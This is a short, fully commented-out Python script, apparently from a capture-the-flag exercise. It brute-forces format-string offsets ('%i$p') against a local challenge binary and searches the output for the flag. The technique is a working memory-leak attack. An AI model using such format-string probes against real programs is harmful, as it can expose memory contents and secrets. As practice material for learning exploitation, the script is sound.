# useless ass script
# import subprocess

# # Path to the vulnerable binary
# binary_path = "./4"

# # Argument to set up the flag (1 or 2 depending on the setup)
# setup_arg = "1"

# # Brute force offset
# for i in range(1, 100):  # Adjust the range as needed
#     payload = f"%{i}$p"  # Generate the payload
#     print(f"Trying offset: {i} with payload: {payload}")

#     # Run the binary with the payload
#     process = subprocess.Popen(
#         [binary_path, setup_arg],
#         stdin=subprocess.PIPE,
#         stdout=subprocess.PIPE,
#         stderr=subprocess.PIPE
#     )
#     stdout, stderr = process.communicate(input=payload.encode())

#     # Check the output for the flag
#     print(stdout.decode())
#     if b"i love furina" in stdout or b"flag" in stdout:
#         print(f"Flag found at offset {i}!")     
#         break
